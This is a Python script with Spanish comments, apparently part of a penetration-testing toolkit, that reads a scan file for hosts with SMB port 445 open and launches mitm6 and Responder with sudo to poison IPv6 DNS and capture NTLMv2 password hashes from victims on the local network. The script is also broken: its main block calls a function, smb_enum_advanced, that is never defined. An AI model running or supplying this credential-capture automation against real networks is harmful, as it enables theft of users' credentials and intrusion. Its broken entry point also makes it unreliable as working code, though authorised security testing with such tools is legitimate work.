import subprocess
import json
import argparse
import itertools
import threading
import time
from datetime import datetime

stop_spinner = False

# Spinner Animado para Feedback Visual
spinner_cycle = itertools.cycle(["|", "/", "-", "\\"])

def spinner(message):
    while not stop_spinner:
        print(f"\r[+] {message}... {next(spinner_cycle)}", end="")
        time.sleep(0.2)  # Velocidad del spinner

def print_status(message, status="INFO"):
    status_symbols = {"INFO": "[+]", "SUCCESS": "[✔]", "ERROR": "[✖]"}
    print(f"{status_symbols.get(status, '[+]')} {message}")

# Función para Leer JSON de Reconocimiento

def read_scan_results(input_file):
    with open(input_file, "r") as json_file:
        scan_data = json.load(json_file)
    smb_targets = []
    for host in scan_data["hosts"]:
        for port in host["open_ports"]:
            if port["port"] == 445:  # Verificar si tiene SMB abierto
                smb_targets.append(host["ip"])
    return smb_targets

# Función para Detectar Interfaz de Red Activa

def get_active_interface():
    try:
        interface = subprocess.run(["ip", "route", "get", "1"], capture_output=True, text=True).stdout.split("dev")[1].split()[0]
        print_status(f"Interfaz activa detectada: {interface}", "SUCCESS")
        return interface
    except Exception as e:
        print_status(f"Error al detectar la interfaz de red: {e}", "ERROR")
        return "eth0"  # Valor por defecto

# MITM6 y Responder para Captura de Hashes NTLMv2

def start_mitm6_and_responder():
    interface = get_active_interface()  # Detectar la interfaz de red activa
    print_status(f"Iniciando MITM6 y Responder para captura de hashes NTLMv2 usando interfaz {interface}")
    global stop_spinner
    stop_spinner = False
    spinner_thread = threading.Thread(target=spinner, args=("Capturando hashes con MITM6 y Responder",))
    spinner_thread.start()  # Iniciar el spinner

    try:
        # Ejecutar MITM6 como subproceso
        mitm6_command = ["sudo", "mitm6", "-l", "/tmp/mitm6.log", "-i", interface]
        mitm6_process = subprocess.Popen(mitm6_command)  # Ejecutar en segundo plano

        # Ejecutar Responder en modo por defecto
        responder_command = ["sudo", "responder", "-I", interface]
        responder_process = subprocess.Popen(responder_command)  # Ejecutar en segundo plano

        # Se espera a que la víctima genere tráfico DNS
        print_status("Esperando tráfico DNS de la víctima...")
        time.sleep(30)  # Ajustado a 30 segundos

        # Detener MITM6 y Responder correctamente
        mitm6_process.terminate()
        responder_process.terminate()
        stop_spinner = True
        spinner_thread.join()
    except subprocess.CalledProcessError as e:
        stop_spinner = True
        spinner_thread.join()
        print_status(f"Error al iniciar MITM6 y Responder: {e}", "ERROR")


def stop_mitm6_and_responder():
    print_status("Deteniendo MITM6 y Responder")
    global stop_spinner
    stop_spinner = True
    subprocess.run(["sudo", "pkill", "mitm6"])
    subprocess.run(["sudo", "pkill", "responder"])
    print_status("MITM6 y Responder detenidos", "SUCCESS")


# Separación de módulos para ejecución ordenada
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Captura de Hashes NTLMv2 con MITM6 y Responder en SMB")
    parser.add_argument("--input", required=True, help="Archivo JSON del reconocimiento (scan_results.json)")
    parser.add_argument("--output", default="smb_enum_adv.json", help="Archivo de salida para guardar resultados")
    args = parser.parse_args()

    smb_enum_advanced(args.input, args.output)